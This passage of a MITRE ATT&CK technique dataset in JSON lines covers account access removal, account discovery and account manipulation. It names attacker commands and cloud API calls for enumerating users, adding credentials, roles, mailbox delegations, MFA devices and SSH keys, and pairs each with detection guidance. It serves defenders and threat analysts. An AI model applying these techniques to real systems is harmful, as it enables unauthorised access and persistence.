SILENTTRINITY Modules July 2019),(Citation: cobaltstrike manual),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: McAfee Sodinokibi October 2019),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET Okrum July 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: FinFisher Citation),(Citation: McAfee Shamoon December 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: GitHub Pupy),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 Siloscape Jun 2021),(Citation: FireEye Op RussianDoll),(Citation: Microsoft runas),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token)"}
{"ID":"T1531","name":"Account Access Removal","description":"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ","url":"https://attack.mitre.org/techniques/T1531","created":"09 October 2019","last modified":"22 March 2023","version":"1.2","tactics":"Impact","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:\n\n* Event ID 4723 - An attempt was made to change an account's password\n* Event ID 4724 - An attempt was made to reset an account's password\n* Event ID 4726 - A user account was deleted\n* Event ID 4740 - A user account was locked out\n\nAlerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.","platforms":"Linux, Office 365, SaaS, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, User Account: User Account Deletion, User Account: User Account Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Hubert Mank","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: CarbonBlack LockerGoga 2019),(Citation: Check Point Meteor Aug 2021),(Citation: Unit42 LockerGoga 2019),(Citation: IBM MegaCortex),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1087","name":"Account Discovery","description":"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","url":"https://attack.mitre.org/techniques/T1087","created":"31 May 2017","last modified":"15 April 2023","version":"2.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Daniel Stepanic, Elastic; Microsoft Threat Intelligence Center (MSTIC); Travis Smith, Tripwire","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),(Citation: FOX-IT May 2016 Mofang),(Citation: trendmicro xcsset xcode project 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: UCF STIG Elevation Account Enumeration)"}
{"ID":"T1087.004","name":"Account Discovery: Cloud Account","description":"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)","url":"https://attack.mitre.org/techniques/T1087/004","created":"21 February 2020","last modified":"16 March 2021","version":"1.2","tactics":"Discovery","detection":"Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"Command: Command Execution","is sub-technique":true,"sub-technique of":"T1087","defenses bypassed":null,"contributors":"Praetorian","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Roadtools),(Citation: MSTIC Nobelium Oct 2021),(Citation: AADInternals Documentation),"}
{"ID":"T1087.002","name":"Account Discovery: Domain Account","description":"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  ","url":"https://attack.mitre.org/techniques/T1087/002","created":"21 February 2020","last modified":"15 April 2023","version":"1.2","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Group: Group Enumeration, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1087","defenses bypassed":null,"contributors":"ExtraHop; Miriam Wiesner, @miriamxyra, Microsoft Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: NCC Group Chimera January 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: AlienVault Sykipot 2011),(Citation: Symantec Buckeye),(Citation: Cybereason Valak May 2020),(Citation: Secureworks IRON RITUAL Profile),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: McAfee Bankshot),(Citation: ESET Telebots Dec 2016),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: TechNet Dsquery),(Citation: US-CERT TA18-074A),(Citation: SecureWorks August 2019),(Citation: Cyberreason Anchor December 2019),(Citation: IBM IcedID November 2017),(Citation: CME Github September 2018),(Citation: CISA SoreFang July 2016),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Microsoft Net),(Citation: Microsoft BlackCat Jun 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Mandiant APT41),(Citation: FireEye FIN6 April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Palo Alto OilRig May 2016),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Kaspersky Poseidon Group),(Citation: ESET ComRAT May 2020),(Citation: Symantec Bumblebee June 2022),(Citation: FireEye APT34 Dec 2017),(Citation: DFIR Ryuk's Return October 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: CrowdStrike IceApple May 2022),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike BloodHound April 2018),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Cycraft Chimera April 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: UCF STIG Elevation Account Enumeration)"}
{"ID":"T1087.003","name":"Account Discovery: Email Account","description":"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)\n\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\n\nIn Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)","url":"https://attack.mitre.org/techniques/T1087/003","created":"21 February 2020","last modified":"31 March 2021","version":"1.1","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Google Workspace, Office 365, Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1087","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SensePost Ruler GitHub),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro TA505 June 2019),(Citation: Symantec Dragonfly),(Citation: ESET Grandoreiro April 2020),(Citation: IBM IcedID November 2017),(Citation: ESET Telebots July 2017),(Citation: Black Hills Attacking Exchange MailSniper, 2016),(Citation: BiZone Lizar May 2021),(Citation: Trend Micro Trickbot Nov 2018),(Citation: CIS Emotet Dec 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1087.001","name":"Account Discovery: Local Account","description":"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.","url":"https://attack.mitre.org/techniques/T1087/001","created":"21 February 2020","last modified":"13 April 2023","version":"1.4","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1087","defenses bypassed":null,"contributors":"Daniel Stepanic, Elastic; Miriam Wiesner, @miriamxyra, Microsoft Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: Lotus Blossom Jun 2015),(Citation: Mandiant APT1),(Citation: ClearSky Siamesekitten August 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Palo Alto Comnie),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: RATANKBA),(Citation: Symantec Buckeye),(Citation: Cybereason Valak May 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Kaspersky Turla Aug 2014),(Citation: McAfee Bankshot),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET InvisiMole June 2018),(Citation: Malwarebytes Pony April 2016),(Citation: S2 Grupo TrickBot June 2017),(Citation: CISA SoreFang July 2016),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FireEye admin@338),(Citation: Unit 42 Kazuar May 2017),(Citation: PowerSploit Documentation),(Citation: Morphisec ShellTea June 2019),(Citation: Github PowerShell Empire),(Citation: Palo Alto OilRig May 2016),(Citation: Kaspersky Poseidon Group),(Citation: ANSSI Sandworm January 2021),(Citation: GitHub PoshC2),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec W32.Duqu),(Citation: ESET ComRAT May 2020),(Citation: F-Secure The Dukes),(Citation: Savill 1999),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Accenture HyperStack October 2020),(Citation: ESET Crutch December 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike BloodHound April 2018),(Citation: Cylance Dust Storm),(Citation: FireEye Periscope March 2018),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: GitHub Pupy),(Citation: Cybereason Cobalt Kitty 2017),(Citation: UCF STIG Elevation Account Enumeration)"}
{"ID":"T1098","name":"Account Manipulation","description":"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).","url":"https://attack.mitre.org/techniques/T1098","created":"31 May 2017","last modified":"12 April 2023","version":"2.5","tactics":"Persistence","detection":"Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)","platforms":"Azure AD, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Modification, Group: Group Modification, Process: Process Creation, User Account: User Account Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Praetorian; Tim MalcomVetter; Wojciech Lesicki","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Dragos Crashoverride 2018),(Citation: Novetta Blockbuster),(Citation: KISA Operation Muzabi),(Citation: aptsim),(Citation: US-CERT TA18-074A),(Citation: Volexity Exchange Marauder March 2021),(Citation: Novetta Blockbuster Destructive Malware),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Metcalf 2015),(Citation: Proofpoint TA505 Jan 2019),(Citation: Symantec Calisto July 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1098.001","name":"Account Manipulation: Additional Cloud Credentials","description":"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation Persistence)","url":"https://attack.mitre.org/techniques/T1098/001","created":"19 January 2020","last modified":"04 May 2023","version":"2.5","tactics":"Persistence","detection":"Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","platforms":"Azure AD, IaaS, SaaS","data sources":"User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1098","defenses bypassed":null,"contributors":"Alex Soler, AttackIQ; Dylan Silva, AWS Security; Expel; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Oleg Kolesnikov, Securonix; Zur Ulianitzky, XM Cyber","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Crowdstrike AWS User Federation Persistence),(Citation: Expel IO Evil in AWS)"}
{"ID":"T1098.003","name":"Account Manipulation: Additional Cloud Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in Azure AD environments, an adversary with the Application Administrator role can add [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to their application's service principal. In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) Similarly, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nSimilarly, an adversary with the Azure AD Global Administrator role can toggle the “Access management for Azure resources” option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.(Citation: Azure AD to AD) ","url":"https://attack.mitre.org/techniques/T1098/003","created":"19 January 2020","last modified":"14 April 2023","version":"2.2","tactics":"Persistence","detection":"Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. ","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS","data sources":"User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1098","defenses bypassed":null,"contributors":"Alex Parsons, Crowdstrike; Alex Soler, AttackIQ; Chris Romano, Crowdstrike; Clément Notin, Tenable; Microsoft Threat Intelligence Center (MSTIC); Pià Consigny, Tenable; Praetorian; Wojciech Lesicki","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CrowdStrike StellarParticle January 2022),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft Requests for Azure AD Roles in Privileged Identity Management)"}
{"ID":"T1098.002","name":"Account Manipulation: Additional Email Delegate Permissions","description":"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)","url":"https://attack.mitre.org/techniques/T1098/002","created":"19 January 2020","last modified":"19 April 2022","version":"2.0","tactics":"Persistence","detection":"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\nEnable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. \n\nA larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","platforms":"Google Workspace, Office 365, Windows","data sources":"Application Log: Application Log Content, Group: Group Modification, User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1098","defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Microsoft Detection and Response Team (DART); Mike Burns, Mandiant; Naveen Vijayaraghavan, Nilesh Dherange (Gurucul)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: MSTIC Nobelium Oct 2021),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: FireEye APT35 2018),(Citation: Gmail Delegation)"}
{"ID":"T1098.005","name":"Account Manipulation: Device Registration","description":"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)","url":"https://attack.mitre.org/techniques/T1098/005","created":"04 March 2022","last modified":"20 April 2023","version":"1.1","tactics":"Persistence","detection":null,"platforms":"Azure AD, SaaS, Windows","data sources":"Active Directory: Active Directory Object Creation, Application Log: Application Log Content, User Account: User Account Modification","is sub-technique":true,"sub-technique of":"T1098","defenses bypassed":null,"contributors":"Joe Gumke, U.S. Bank; Mike Moran; Pawel Partyka, Microsoft 365 Defender","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),(Citation: AADInternals Documentation),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: CISA MFA PrintNightmare),(Citation: Microsoft - Device Registration),(Citation: Mandiant APT29 Microsoft 365 2022)"}
{"ID":"T1098.004","name":"Account Manipulation: SSH Authorized Keys","description":"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) \n\nWhere authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. \n\nSSH keys can also be 